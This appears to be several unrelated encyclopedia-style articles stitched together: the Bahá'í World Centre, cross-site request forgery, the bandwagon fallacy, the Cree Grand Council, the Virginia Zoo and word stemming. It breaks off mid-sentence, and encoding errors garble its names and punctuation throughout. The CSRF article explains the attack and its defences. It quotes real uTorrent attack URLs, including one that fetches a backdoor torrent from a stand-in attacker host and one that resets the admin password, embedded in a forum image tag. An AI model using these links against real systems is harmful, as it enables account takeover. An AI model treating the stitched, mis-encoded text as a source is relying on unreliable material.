pilgrimage as Bah√° º√≠s would travel the long distance to see Bah√° ºu'll√°h. The location of the Shrine of the B√°b on Mount Carmel was indicated by Bah√° ºu'll√°h to his son  ªAbdu'l-Bah√° during a visit to Haifa. Furthermore, the establishing of the administrative centre of the Bah√° º√≠ Faith on Mount Carmel was also indicated by Bah√° ºu'll√°h in his Tablet of Carmel, which is considered one of the charter documents of the Bah√° º√≠ administration. Bah√° ºu'll√°h died in 1892 near Acre, and his resting place is in Bahji. Following his death, Bah√° ºu'll√°h's son  ªAbdu'l-Bah√° was appointed to be the head of His Father's Faith and the condition of the area as the centre of Bah√° º√≠ activity continued. He continued to correspond with Bah√° º√≠s all over the world, including now Bah√° º√≠s in the West. While he was still officially a prisoner and confined to  ªAkka,  ªAbdu'l-Bah√° also organized the transfer of the remains of the B√°b from Iran to Palestine. He organized the purchase of land on Mount Carmel that Bah√° ºu'll√°h had instructed should be used to lay the remains of the B√°b, and organized for the construction of the Shrine of the B√°b. This process took another 10 years and was completed in 1909. In 1908, the Young Turks revolution freed all political prisoners in the Ottoman Empire, and  ªAbdu'l-Bah√° was freed from imprisonment. Soon after the revolution, he moved to live in Haifa near the Shrine of the B√°b, and since then the administrative headquarters of the religion have been in Haifa. During the final years of  ªAbdu'l-Bah√°'s life the increasing levels of correspondence led to the employment of a number of secretaries including some in Western languages and the provision of a Pilgrim House in the area.  ªAbdu'l-Bah√° died in 1921, and he is buried in Haifa, which was then in British Mandate Palestine. After  ªAbdu'l-Bah√°'s death, Shoghi Effendi was the head of the religion, and he directed the development of a number of separate projects in the area. He renovated the house of Bah√° ºu'll√°h in Bahji in 1929, and in the 1950s secured legal possession of the lands around the building, creating a number of gardens. He also obtained possession of other sites around Acre related to Bah√° ºu'll√°h's life, including the House of  ªAbbud. Around Haifa, he expanded the Shrine of the B√°b by developing its golden-domed superstructure, and purchased lands surrounding the Shrine in order to create gardens. Shoghi Effendi had also decided that the buildings housing the institutions of the religion indicated in Bah√° ºu'll√°h's Tablet of Carmel, including the Universal House of Justice, the as yet unestablished governing body of the worldwide Bah√° º√≠ community, would be arranged in the shape of an arc surrounded by gardens. The fulcrum of this arc would be the Monument Gardens, which hold the graves of members of the Bah√° º√≠ holy family. During his own lifetime he started the construction of one of the buildings comprising the arc, the International Archives building. He also negotiated tax-exempt status for all Baha'i properties. The religion's situation in Israel was clarified in an agreement signed in 1987 by then Vice-Premier and Foreign Minister, Shimon Peres, in which the government formally acknowledged the Bah√° º√≠ Faith as a ‚Äúrecognized religious community in Israel,‚Äù declared its \\"friendly relations\\" with the Bah√° º√≠ world community, noted that the \\"holiest places of the Bah√° º√≠ Faith, ‚Ä¶ are located in Israel\\", and confirmed \\"that the Universal House of Justice is the Trustee of the Bah√° º√≠ International Community over the Holy Places of the Bah√° º√≠ Faith in Israel and over the Bah√° º√≠ endowments in Israel\\". The other buildings of the Arc, the Seat of the Universal House of Justice, the Centre for the Study of the Sacred Texts, and the Seat of the International Teaching Centre, were completed in 1982, 1999 and 2000 respectively. The fifth and yet to be built building, the International Bah√° º√≠ library, is planned to be eventually built at the eastern end of the Arc, but the owner does not want to sell the land. The terraces around the Shrine of the B√°b were also completed in 2001. Administration Centre for the Study of the Texts Much of the international governance and coordination of the Bah√° º√≠ Faith occurs at the Bah√° º√≠ World Centre. These include decisions that affect the religion on a global level, and the study and translation of the Bah√° º√≠ holy writings. The Universal House of Justice, representing the supreme governing body of the Bah√° º√≠ Faith, resides in Haifa, along with the International Teaching Centre, which coordinates the activities between the Continental Counsellors and works as a liaison between them and the House of Justice. =Staff= During Shoghi Effendi's time as the head of the Bah√° º√≠ Faith, the British Mandate of Palestine was dealing with a growing conflict between Zionists and Arabs in the region of Palestine. With the end of the mandate in 1948, and the resulting 1948 Arab-Israeli War, the majority of the Bah√° º√≠s in Israel left the country, and only Shoghi Effendi and a few others remained behind. In 1963 the first Universal House of Justice was elected, with its seat in Haifa, and since then the number of support staff in Haifa has grown to several hundred support staff from over sixty countries. The increase in staff was due to the international growth of the Bah√° º√≠ community and the increased range of work which is done at the Bah√° º√≠ World Centre; the staff include the House of Justice's specialized departments such as the secretariat, research, finance, statistics and others which tend to the maintenance of the gardens and buildings. Additionally, select individuals are approinted to other Bah√° º√≠ bodies such as the International Teaching Centre and the Baha ºi International Development Organization and as such serve at the Baha'i World Centre. Uniquely, despite the presence of several hundred volunteer staff in Haifa and Acre, there is no formal community of Bah√° º√≠s in Israel in the sense that there are no Nineteen Day Feasts, Spiritual Assemblies etc. Additionally, since the days of Bah√° ºu'll√°h, Bah√° º√≠s have observed a self-imposed ban on teaching their religion to the local population of Israel. Formal declarations of faith by Israelis are not accepted.

At risk are web applications that perform actions based on input from trusted and authenticated users without requiring the user to authorize the specific action. A user who is authenticated by a cookie saved in the user's web browser could unknowingly send an HTTP request to a site that trusts the user and thereby causes an unwanted action. A general property of web browsers is that they will automatically and invisibly include any cookies used by a given domain in any web request sent to that domain. This property is exploited by CSRF attacks in that any web request made by a browser will automatically include any cookies (including session cookies and others) created when a victim logs into a website. In the event that a user is tricked into inadvertently submitting a request through their browser these automatically included cookies will cause the forged request to appear real to the web server and it will perform any appropriately requested actions including returning data, manipulating session state, or making changes to the victim's account. In order for a CSRF attack to work, an attacker must identify a reproducible web request that executes a specific action such as changing an account password on the target page. Once such a request is identified, a link can be created that generates this malicious request and that link can be embedded on a page within the attacker's control. This link may be placed in such a way that it is not even necessary for the victim to click the link. For example, it may be embedded within an html image tag on an email sent to the victim which will automatically be loaded when the victim opens their email. Once the victim has clicked the link, their browser will automatically include any cookies used by that website and submit the request to the web server. The web server will not be able to identify the forgery because the request was made by a user that was logged in, and submitted all the requisite cookies. Cross-site request forgery is an example of a confused deputy attack against a web browser because the web browser is tricked into submitting a forged request by a less privileged attacker. CSRF commonly has the following characteristics: * It involves sites that rely on a user's identity. * It exploits the site's trust in that identity. * It tricks the user's browser into sending HTTP requests to a target site. * It involves HTTP requests that have side effects. History CSRF vulnerabilities have been known and in some cases exploited since 2001. Because it is carried out from the user's IP address, some website logs might not have evidence of CSRF. Exploits are under-reported, at least publicly, and as of 2007 there were few well-documented examples: * The Netflix website in 2006 had numerous vulnerabilities to CSRF, which could have allowed an attacker to perform actions such as adding a DVD to the victim's rental queue, changing the shipping address on the account, or altering the victim's login credentials to fully compromise the account. * The online banking web application of ING Direct was vulnerable to a CSRF attack that allowed illicit money transfers. * Popular video website YouTube was also vulnerable to CSRF in 2008 and this allowed any attacker to perform nearly all actions of any user. * McAfee Secure was also vulnerable to CSRF and it allowed attackers to change their company system. This is fixed in newer versions. New attacks against web- enabled devices were carried out in 2018, including attempts to change the DNS settings of routers. Some router manufacturers hurriedly released firmware updates to improve protection, and advised users to change router settings to reduce the risk. Details were not released, citing \\"obvious security reasons\\". Example A National Vulnerability Database page describing a CSRF vulnerability Attackers who can find a reproducible link that executes a specific action on the target page while the victim is logged in can embed such link on a page they control and trick the victim into opening it. The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in an HTML email body or attachment. A real CSRF vulnerability in uTorrent (CVE-2008-6586) exploited the fact that its web console accessible at localhost:8080 allowed critical actions to be executed using a simple GET request: ;Force a .torrent file download : http://localhost:8080/gui/?action=add- url&s=http://evil.example.com/backdoor.torrent ;Change uTorrent administrator password : http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin Attacks were launched by placing malicious, automatic-action HTML image elements on forums and email spam, so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable uTorrent version at the same time as opening these pages were susceptible to the attack. CSRF attacks using image tags are often made from Internet forums, where users are allowed to post images but not JavaScript, for example using BBCode: [img]http://localhost:8080/gui/?action=add- url&s=http://evil.example.com/backdoor.torrent[/img] When accessing the attack link to the local uTorrent application at , the browser would also always automatically send any existing cookies for that domain. This general property of web browsers enables CSRF attacks to exploit their targeted vulnerabilities and execute hostile actions as long as the user is logged into the target website (in this example, the local uTorrent web interface) at the time of the attack. In the uTorrent example described above, the attack was facilitated by the fact that uTorrent's web interface used GET request for critical state- changing operations (change credentials, download a file etc.), which explicitly discourages: Because of this assumption, many existing CSRF prevention mechanisms in web frameworks will not cover GET requests, but rather apply the protection only to HTTP methods that are intended to be state-changing. Forging login requests An attacker may forge a request to log the victim into a target website using the attacker's credentials; this is known as login CSRF. Login CSRF makes various novel attacks possible; for instance, an attacker can later log into the site with his legitimate credentials and view private information like activity history that has been saved in the account. This attack has been demonstrated against GoogleAdam Barth, Collin Jackson, and John C. Mitchell, Robust Defenses for Cross-Site Request Forgery, Proceedings of the 15th ACM Conference on Computer and Communications Security, ACM 2008 and Yahoo.Joseph Foulds, Passive monitoring login request forgery, Yahoo HTTP verbs and CSRF Depending on the type, the HTTP request methods vary in their susceptibility to the CSRF attacks (due to the differences in their handling by the web browsers). Therefore, the protective measures against an attack depend on the method of the HTTP request. * In HTTP GET the CSRF exploitation is trivial, using methods described above, such as a simple hyperlink containing manipulated parameters and automatically loaded by an IMG tag. By the HTTP specification however, GET should be used as a safe method, that is, not significantly changing user's state in the application. Applications using GET for such operations should switch to HTTP POST or use anti-CSRF protection. * the HTTP POST vulnerability to CSRF depends on the usage scenario: In simplest form of POST with data encoded as a query string (\`field1=value1&field2=value2\`) CSRF attack is easily implemented using a simple HTML form and anti-CSRF measures must be applied. If data is sent in any other format (JSON, XML) a standard method is to issue a POST request using XMLHttpRequest with CSRF attacks prevented by Same-origin policy (SOP) and Cross-origin resource sharing (CORS); there is a technique to send arbitrary content from a simple HTML form using \`ENCTYPE\` attribute; such a fake request can be distinguished from legitimate ones by \`text/plain\` content type, but if this is not enforced on the server, CSRF can be executed *other HTTP methods (PUT, DELETE etc.) can only be issued using XMLHttpRequest with Same-origin policy (SOP) and Cross-origin resource sharing (CORS) and preventing CSRF; these measures however will not be active on websites that explicitly disable them using \`Access-Control-Allow-Origin: *\` header Other approaches to CSRF Additionally, while typically described as a static type of attack, CSRF can also be dynamically constructed as part of a payload for a cross-site scripting attack, as demonstrated by the Samy worm, or constructed on the fly from session information leaked via offsite content and sent to a target as a malicious URL. CSRF tokens could also be sent to a client by an attacker due to session fixation or other vulnerabilities, or guessed via a brute-force attack, rendered on a malicious page that generates thousands of failed requests. The attack class of \\"Dynamic CSRF\\", or using a per-client payload for session-specific forgery, was described in 2009 by Nathan Hamiel and Shawn Moyer at the BlackHat Briefings,Dynamic CSRF though the taxonomy has yet to gain wider adoption. A new vector for composing dynamic CSRF attacks was presented by Oren Ofer at a local OWASP chapter meeting on January 2012 ‚Äì \\"AJAX Hammer ‚Äì Dynamic CSRF\\".Owasp.org: Israel 2012/01: AJAX Hammer ‚Äì Harnessing AJAX for CSRF AttacksDownloads ‚Äì hasc- research ‚Äì hasc-research ‚Äì Google Project Hosting. Code.google.com (2013-06-17). Retrieved on 2014-04-12. Effects Severity metrics have been issued for CSRF vulnerabilities that result in remote code execution with root privileges as well as a vulnerability that can compromise a root certificate, which will completely undermine a public key infrastructure. Limitations Several things have to happen for cross-site request forgery to succeed: # The attacker must target either a site that doesn't check the referrer header or a victim with a browser or plugin that allows referer spoofing. # The attacker must find a form submission at the target site, or a URL that has side effects, that does something (e.g., transfers money, or changes the victim's e-mail address or password). # The attacker must determine the right values for all the forms or URL inputs; if any of them are required to be secret authentication values or IDs that the attacker can't guess, the attack will most likely fail (unless the attacker is extremely lucky in their guess). # The attacker must lure the victim to a web page with malicious code while the victim is logged into the target site. The attack is blind: the attacker cannot see what the target website sends back to the victim in response to the forged requests, unless they exploit a cross-site scripting or other bug at the target website. Similarly, the attacker can only target any links or submit any forms that come up after the initial forged request if those subsequent links or forms are similarly predictable. (Multiple targets can be simulated by including multiple images on a page, or by using JavaScript to introduce a delay between clicks.) Given these constraints, an attacker might have difficulty finding logged-in victims or attackable form submissions. On the other hand, attack attempts are easy to mount and invisible to victims, and application designers are less familiar with and prepared for CSRF attacks than they are for, say, password cracking dictionary attacks. Prevention Most CSRF prevention techniques work by embedding additional authentication data into requests that allows the web application to detect requests from unauthorized locations. =Synchronizer token pattern= Synchronizer token pattern (STP) is a technique where a token, secret and unique value for each request, is embedded by the web application in all HTML forms and verified on the server side. The token may be generated by any method that ensures unpredictability and uniqueness (e.g. using a hash chain of random seed). The attacker is thus unable to place a correct token in their requests to authenticate them. Example of STP set by Django in a HTML form: STP is the most compatible as it only relies on HTML, but introduces some complexity on the server side, due to the burden associated with checking validity of the token on each request. As the token is unique and unpredictable, it also enforces proper sequence of events (e.g. screen 1, then 2, then 3) which raises usability problem (e.g. user opens multiple tabs). It can be relaxed by using per session CSRF token instead of per request CSRF token. =Cookie-to- header token= Web applications that use JavaScript for the majority of their operations may use the following anti-CSRF technique: * On an initial visit without an associated server session, the web application sets a cookie which is scoped appropriately so that it should not be provided during cross-origin requests. The cookie typically contains a random token which may remain the same for up to the life of the web session Set-Cookie: csrf_token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; Expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/; Domain=.wikipedia.org; SameSite=Lax; Secure * JavaScript operating on the client side reads its value and copies it into a custom HTTP header sent with each transactional request X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql * The server validates presence and integrity of the token Security of this technique is based on the assumption that only JavaScript running on the client side of an HTTPS connection to the server that initially set the cookie will be able to read the cookie's value. JavaScript running from a rogue file or email should not be able to successfully read the cookie value to copy into the custom header. Even though the cookie will be automatically sent with the rogue request, the server will still expect a valid header. The CSRF token itself should be unique and unpredictable. It may be generated randomly, or it may be derived from the session token using HMAC: csrf_token = HMAC(session_token, application_secret) The CSRF token cookie must not have httpOnly flag, as it is intended to be read by the JavaScript by design. This technique is implemented by many modern frameworks, such as Django and AngularJS. Because the token remains constant over the whole user session, it works well with AJAX applications, but does not enforce sequence of events in the web application. The protection provided by this technique can be thwarted if the target website disables its same- origin policy using one of the following techniques: * file granting unintended access to Silverlight controls * file granting unintended access to Flash movies =Double Submit Cookie= Similarly to the cookie-to-header approach, but without involving JavaScript, a site can set a CSRF token as a cookie, and also insert it as a hidden field in each HTML form. When the form is submitted, the site can check that the cookie token matches the form token. The same-origin policy prevents an attacker from reading or setting cookies on the target domain, so they cannot put a valid token in their crafted form. The advantage of this technique over the Synchronizer pattern is that the token does not need to be stored on the server. =SameSite cookie attribute= An additional \\"SameSite\\" attribute can be included when the server sets a cookie, instructing the browser on whether to attach the cookie to cross-site requests. If this attribute is set to \\"strict\\", then the cookie will only be sent on same-origin requests, making CSRF ineffective. However, this requires the browser to recognise and correctly implement the attribute, and also requires the cookie to have the \\"Secure\\" flag. =Client-side safeguards= Browser extensions such as RequestPolicy (for Mozilla Firefox) or uMatrix (for both Firefox and Google Chrome/Chromium) can prevent CSRF by providing a default-deny policy for cross-site requests. However, this can significantly interfere with the normal operation of many websites. The CsFire extension (also for Firefox) can mitigate the impact of CSRF with less impact on normal browsing, by removing authentication information from cross-site requests. The NoScript extension for Firefox mitigates CSRF threats by distinguishing trusted from untrusted sites, and removing authentication & payloads from POST requests sent by untrusted sites to trusted ones. The Application Boundary Enforcer module in NoScript also blocks requests sent from internet pages to local sites (e.g. localhost), preventing CSRF attacks on local services (such as uTorrent) or routers. The Self Destructing Cookies extension for Firefox does not directly protect from CSRF, but can reduce the attack window, by deleting cookies as soon as they are no longer associated with an open tab. =Other techniques= Various other techniques have been used or proposed for CSRF prevention historically: * Verifying that the request's headers contain \`X-Requested-With\` (used by Ruby on Rails before v2.0 and Django before v1.2.5), or checking the HTTP \`Referer\` header and/or HTTP \`Origin\` header.Origin Header Proposal . People.mozilla.org. Retrieved on 2013-07-29. However, this is insecure ‚Äì a combination of browser plugins and redirects can allow an attacker to provide custom HTTP headers on a request to any website, hence allowing a forged request. * Checking the HTTP \`Referer\` header to see if the request is coming from an authorized page is commonly used for embedded network devices because it does not increase memory requirements. However, a request that omits the \`Referer\` header must be treated as unauthorized because an attacker can suppress the \`Referer\` header by issuing requests from FTP or HTTPS URLs. This strict \`Referer\` validation may cause issues with browsers or proxies that omit the \`Referer\` header for privacy reasons. Also, old versions of Flash (before 9.0.18) allow malicious Flash to generate GET or POST requests with arbitrary HTTP request headers using CRLF Injection. Similar CRLF injection vulnerabilities in a client can be used to spoof the referrer of an HTTP request. * POST request method was for a while perceived as immune to trivial CSRF attacks using parameters in URL (using GET method). However, both POST and any other HTTP method can be now easily executed using XMLHttpRequest. Filtering out unexpected GET requests still prevents some particular attacks, such as cross-site attacks using malicious image URLs or link addresses and cross-site information leakage through \`<script>\` elements (JavaScript hijacking); it also prevents (non-security-related) problems with aggressive web crawlers and link prefetching. Cross-site scripting (XSS) vulnerabilities (even in other applications running on the same domain) allow attackers to bypass essentially all CSRF preventions.

Other names for the fallacy include common belief fallacy or appeal to (common) belief, appeal to the majority, appeal to the masses, appeal to popularity, argument from consensus, authority of the many, bandwagon fallacy, consensus gentium (Latin for \\"agreement of the people\\"), democratic fallacy, and mob appeal.  Description  Argumentum ad populum is a type of informal fallacy, specifically a fallacy of relevance, and is similar to an argument from authority (argumentum ad verecundiam). It uses an appeal to the beliefs, tastes, or values of a group of people, stating that because a certain opinion or attitude is held by a majority, it is therefore correct. Appeals to popularity are common in commercial advertising that portrays products as desirable because they are used by many people or associated with popular sentiments instead of communicating the merits of the products themselves. The inverse argument, that something that is unpopular must be flawed, is also a form of this fallacy. The fallacy is similar in structure to certain other fallacies that involve a confusion between the justification of a belief and its widespread acceptance by a given group of people. When an argument uses the appeal to the beliefs of a group of experts, it takes on the form of an appeal to authority; if the appeal is to the beliefs of a group of respected elders or the members of one's community over a long time, then it takes on the form of an appeal to tradition. One who commits this fallacy may assume that individuals commonly analyze and edit their beliefs and behaviors based on majority opinion. This is often not the case. (See conformity.) = Scholarship = The philosopher Irving Copi defined argumentum ad populum ('appeal to the people') differently from an appeal to popular opinion itself, as an attempt to rouse the \\"emotions and enthusiasms of the multitude\\". = Valid/Strong and Invalid/Weak uses = Douglas N. Walton argues that appeals to popular opinion can be logically valid in some cases, such as in political dialogue within a democracy. The argumentum ad populum can be a cogent (strong) argument in inductive logic. For example, a poll of a sizeable population may find 100% prefer a certain brand of product over another. A cogent argument can then be made that the next person to be considered will also very likely prefer that brand (but not always 100% since there could be exceptions), and the poll is strong evidence of that claim. An example of a weak inductive argument, however, would be saying: \\"Support the brand of the product. People need a practical product to ensure the fulfillment of its consumers as they say such a product from a particular brand is required according to the polls. People have suffered too long for not receiving the product from this brand.\\" The problem stems from the conclusion likely not following from the premises. What is so special about this product? How is it certain if one product isn't used by the majority, is responsible for their suffering? How will this product lead to a better quality of life? Why is this product made? How can it be induced the polls aren't from a biased sample? These are some of the questions which concern the overall strength of the argument inductively. For deductive reasoning as proof, for instance, to say the poll proves the preferred brand is superior to the competition in its composition or that everyone prefers that brand to the other. = Language = Linguistic descriptivists argue that correct grammar, spelling, and expressions are defined by the language's speakers, especially in languages which do not have a central governing body. According to this viewpoint, if an incorrect expression is commonly used, it becomes correct. In contrast, linguistic prescriptivists believe that incorrect expressions are incorrect regardless of how many people use them. Reversals In some circumstances, a person may argue that the fact that Y people believe X to be true implies that X is false. This line of thought is closely related to the appeal to spite fallacy given that it invokes a person's contempt for the general populace or something about the general populace to persuade them that most are wrong about X. This ad populum reversal commits the same logical flaw as the original fallacy given that the idea \\"X is true\\" is inherently separate from the idea that \\"Y people believe X\\": \\"Y people believe in X as true, purely because Y people believe in it, and not because of any further considerations. Therefore X must be false.\\" While Y people can believe X to be true for fallacious reasons, X might still be true. Their motivations for believing X do not affect whether X is true or false. Y=most people, a given quantity of people, people of a particular demographic. X=a statement that can be true or false. Examples: *\\"Are you going to be a mindless conformist drone drinking milk and water like everyone else, or will you wake up and drink my product?\\" *\\"Everyone likes The Beatles and that probably means that they didn't have nearly as much talent as <Y band>, which didn't sell out.\\" *\\"The German people today consists of the Auschwitz generation, with every person in power being guilty in some way. How on earth can we buy the generally held propaganda that the Soviet Union is imperialistic and totalitarian? Clearly, it must not be.\\" *\\"Everyone loves <A actor>. <A actor> must be nowhere near as talented as the devoted and serious method actors that aren't so popular like <B actor>.\\" In general, the reversal usually goes: Most people believe A and B are both true. B is false. Thus, A is false. The similar fallacy of chronological snobbery is not to be confused with the ad populum reversal. Chronological snobbery is the claim that if belief in both X and Y was popularly held in the past and if Y was recently proved to be untrue then X must also be untrue. That line of argument is based on a belief in historical progress and not‚Äîlike the ad populum reversal is‚Äîon whether or not X and/or Y is currently popular.

The Grand Council has twenty members: a Grand Chief and Deputy-Grand Chief elected at large by the Cree people, the Chiefs elected by each of the ten communities, and one other representative from each community. The current Grand Chief Dr. Abel Bosum was elected in 2017. The current Deputy Grand Chief is Mandy Gull. The Grand Council's head office is located in the Cree community of Nemaska, with other offices and embassies in Montreal, Ottawa and Quebec City. History The Grand Council was formed in 1974 in response to the James Bay Cree hydroelectric conflict, which had already been underway since 1971. When the James Bay Project was first announced, Eeyou Istchee was still governed by a traditional political structure. That political structure was organized to exploit the resources of Eeyou Istchee by their traditional way of life. The land of Eeyou Istchee was divided into smaller territories, each headed by a leader or \\"ucim√¢u\\", that were resource management units and a means of distributing the Eeyou people over a vast territory. So the Crees organized themselves at a council of Cree leaders to represent their rights at the negotiations between the Cree Nation and the Quebec and Canadian governments, which led to the signing of the James Bay and Northern Quebec Agreement in November 1975. On July 24, 2012, the Quebec government signed an accord with the Eeyou Nation that would result in the abolition of the municipality of Baie-James and the creation of a new regional government Eeyou Istchee/Baie- James Territory. Cree Nation Government The Cree Nation Government (Gouvernement de la nation crie, ·êÑ·ìÖ·ëé·êØ·î®·ê¶·íã·íâ·ì≤, ·êÑ·î®·î´·ëé·êØ·î®·ê¶·íã·íâ·ì≤) formed in 1978 under the name Cree Regional Authority (CRA) and serves as the administrative authority of the Cree Nation of Eeyou Istchee and provides programs and services to its communities. The CRA is responsible for environmental protection and is also the legal body representing the nation to provincial and federal administrations. While the CNG is a separate legal entity from the Grand Council of the Crees (Eeyou Istchee), they have identical membership, board of directors, governing structures and are de facto managed and operated as one organization by the Cree Nation.

In October 1995, the Grand Council issued a \\"Message regarding the rights of the Crees and other Aboriginal Peoples of Canada\\", which stated, in part: Matthew Coon Come, \\"A Message regarding the rights of the Crees and other Aboriginal Peoples in Canada\\", in Grand Council of the Crees, Sovereign Injustice: Forcible Inclusion of the James Bay Crees and Cree Territory into a Sovereign Quebec. Nemaska, Quebec, 1995. A few days prior to the October 30, 1995, province-wide referendum on secession from Canada, the Grand Council facilitated a referendum within Eeyou Istchee on the question of whether the Crees should be authorized to separate from an independent Quebec, in order to remain part of Canada. Over 96% of participating voters chose to remain in Canada.Source: Grand Council of the Crees, Never Without Consent: James Bay Crees' Stand Against Forcible Inclusion into an Independent Quebec. Toronto: ECW Press, 1998, p. 10. Grand Chief Matthew Mukash is considered a traditionalist and fought against the Great Whale hydroelectric project in the 1990s, alongside the Grand Chiefs Matthew Coon Come and Billy Diamond. In 2002, he opposed the signing of the Paix des Braves, a comprehensive 50 year political and economic agreement with the Government of Quebec, and as well as the 2002 and 2004 agreements with Hydro-Qu√©bec on the joint development of the hydroelectric resources of the Rupert River. Elected in late 2005 as Grand Chief, in replacement of Ted Moses, Matthew Mukash is opposed to the Rupert River Diversion which is undergoing joint Quebec-Cree environmental assessment since 2004. Mukash has advocated with the Government of Quebec and Hydro-Qu√©bec to pursue wind power as an alternative source of economic development and energy. His other main political goals are to prepare a constitution, build sovereignty, encourage nation-building, and move Cree leadership back to Eeyou Istchee from Montr√©al and Ottawa.

The zoo opened in 1900, and was accredited by the Association of Zoos and Aquariums (AZA) in 1987. History In 1892, the City of Norfolk purchased the that was currently occupied by Lafayette Park. In 1900, the park began acquiring animals to exhibit, and by 1901 its collection exceeded 200 animals, including mammals, birds and reptiles. In 1974, the facility was fenced off from the city park, and renamed Lafayette Zoological Park. Though fenced off, residents of the nearby LaValette Avenue could see the zoo's elephant exhibit from their homes. Newcomers, unfamiliar with the fact that a zoo was in the location, sometimes called the police at the sight of the elephants. Between 1974 and 1980, most of the zoo's old exhibits were renovated. Also in 1974, the Friends of the Zoo was established to act as a support organization for the development of the zoo. In 1989, it was renamed as the Virginia Zoological Society and established as a non-profit organization. In 1985, Lafayette Zoological Park was renamed the Virginia Zoological Park at Norfolk (commonly known as the Virginia Zoo). In 1987, the zoo gained accreditation from the Association of Zoos and Aquariums (AZA). In 1992, a Master Plan was adopted by City of Norfolk and Virginia Zoological Society. Plans included a new Education Complex and Visitor Center, as well as African, North American, Australian, South American and Asian-themed exhibits. In 1999, Part I of Phase I opened, including Gelada baboon habitat and Xaxaba African village and 100th Anniversary of Virginia Zoo and Lafayette Park. In 2001, design for Master Plan Phase II: North America exhibit began. The following year Part II of Phase I opened: African Okavango Delta exhibit, thus completing Phase I of the Master Plan. In 2004, Part I of Phase II opened: prairie dog habitat. The following year, the zoo got its third elephant named Cita. In 2011, Part I of Phase IV opened: \\"Trail of the Tiger\\" exhibit opened with various fauna of India and Southeast Asia. Exhibits ;Trail of the Tiger This exhibit was opened in 2011. It features animals from Asia, and nearly doubles the number of large animals at the zoo. Among the animals in this exhibit are Malayan tigers, oriental small-clawed otters, Bornean orangutans, siamangs, northern white-cheeked gibbons, Malayan tapirs, binturongs, rhinoceros hornbills, fairy-bluebirds, azure-winged magpies, and chestnut-breasted malkoha. The exhibit includes a raised boardwalk over the \\"Asian forest\\", and a cave with views into the tier and orangutan exhibits. Another viewing area allows underwater views of the otters and tigers. ;Okavango Delta Named after the real life Okavango Delta in Africa, this exhibit opened in 2002.

The stem need not be identical to the morphological root of the word; it is usually sufficient that related words map to the same stem, even if this stem is not in itself a valid root. Algorithms for stemming have been studied in computer science since the 1960s. Many search engines treat words with the same stem as synonyms as a kind of query expansion, a process called conflation. A computer program or subroutine that stems word may be called a stemming program, stemming algorithm, or stemmer. Examples A stemmer for English operating on the stem cat should identify such strings as cats, catlike, and catty. A stemming algorithm might also reduce the words fishing, fished, and fisher to the stem fish. The stem need not be a word, for example the Porter algorithm reduces, argue, argued, argues, arguing, and argus to the stem argu. History The first published stemmer was written by Julie Beth Lovins in 1968. This paper was remarkable for its early date and had great influence on later work in this area. Her paper refers to three earlier major attempts at stemming algorithms, by Professor John W. Tukey of Princeton University, the algorithm developed at Harvard University by Michael Lesk, under the direction of Professor Gerard Salton, and a third algorithm developed by James L. Dolby of R and D Consultants, Los Altos, California. A later stemmer was written by Martin Porter and was published in the July 1980 issue of the journal Program. This stemmer was very widely used and became the de facto standard algorithm used for English stemming. Dr. Porter received the Tony Kent Strix award in 2000 for his work on stemming and information retrieval. Many implementations of the Porter stemming algorithm were written and freely distributed; however, many of these implementations contained subtle flaws. As a result, these stemmers did not match their potential. To eliminate this source of error, Martin Porter released an official free software (mostly BSD-licensed) implementation of the algorithm around the year 2000. He extended this work over the next few years by building Snowball, a framework for writing stemming algorithms, and implemented an improved English stemmer together with stemmers for several other languages. The Paice-Husk Stemmer was developed by Chris D Paice at Lancaster University in the late 1980s, it is an iterative stemmer and features an externally stored set of stemming rules. The standard set of rules provides a 'strong' stemmer and may specify the removal or replacement of an ending. The replacement technique avoids the need for a separate stage in the process to recode or provide partial matching. Paice also developed a direct measurement for comparing stemmers based on counting the over-stemming and under-stemming errors. Algorithms There are several types of stemming algorithms which differ in respect to performance and accuracy and how certain stemming obstacles are overcome. A simple stemmer looks up the inflected form in a lookup table. The advantages of this approach are that it is simple, fast, and easily handles exceptions. The disadvantages are that all inflected forms must be explicitly listed in the table: new or unfamiliar words are not handled, even if they are perfectly regular (e.g. cats ~ cat), and the table may be large. For languages with simple morphology, like English, table sizes are modest, but highly inflected languages like Turkish may have hundreds of potential inflected forms for each root. A lookup approach may use preliminary part-of-speech tagging to avoid overstemming.Yatsko, V. A.; Y-stemmer =The production technique= The lookup table used by a stemmer is generally produced semi-automatically. For example, if the word is \\"run\\", then the inverted algorithm might automatically generate the forms \\"running\\", \\"runs\\", \\"runned\\", and \\"runly\\". The last two forms are valid constructions, but they are unlikely.. =Suffix-stripping algorithms= Suffix stripping algorithms do not rely on a lookup table that consists of inflected forms and root form relations. Instead, a typically smaller list of \\"rules\\" is stored which provides a path for the algorithm, given an input word form, to find its root form. Some examples of the rules include: * if the word ends in 'ed', remove the 'ed' * if the word ends in 'ing', remove the 'ing' * if the word ends in 'ly', remove the 'ly' Suffix stripping approaches enjoy the benefit of being much simpler to maintain than brute force algorithms, assuming the maintainer is sufficiently knowledgeable in the challenges of linguistics and morphology and encoding suffix stripping rules. Suffix stripping algorithms are sometimes regarded as crude given the poor performance when dealing with exceptional relations (like 'ran' and 'run'). The solutions produced by suffix stripping algorithms are limited to those lexical categories which have well known suffixes with few exceptions. This, however, is a problem, as not all parts of speech have such a well formulated set of rules. Lemmatisation attempts to improve upon this challenge. Prefix stripping may also be implemented. Of course, not all languages use prefixing or suffixing. Additional algorithm criteria Suffix stripping algorithms may differ in results for a variety of reasons. One such reason is whether the algorithm constrains whether the output word must be a real word in the given language. Some approaches do not require the word to actually exist in the language lexicon (the set of all words in the language). Alternatively, some suffix stripping approaches maintain a database (a large list) of all known morphological word roots that exist as real words. These approaches check the list for the existence of the term prior to making a decision. Typically, if the term does not exist, alternate action is taken. This alternate action may involve several other criteria. The non-existence of an output term may serve to cause the algorithm to try alternate suffix stripping rules. It can be the case that two or more suffix stripping rules apply to the same input term, which creates an ambiguity as to which rule to apply. The algorithm may assign (by human hand or stochastically) a priority to one rule or another. Or the algorithm may reject one rule application because it results in a non-existent term whereas the other overlapping rule does not. For example, given the English term friendlies, the algorithm may identify the ies suffix and apply the appropriate rule and achieve the result of friendl. friendl is likely not found in the lexicon, and therefore the rule is rejected. One improvement upon basic suffix stripping is the use of suffix substitution. Similar to 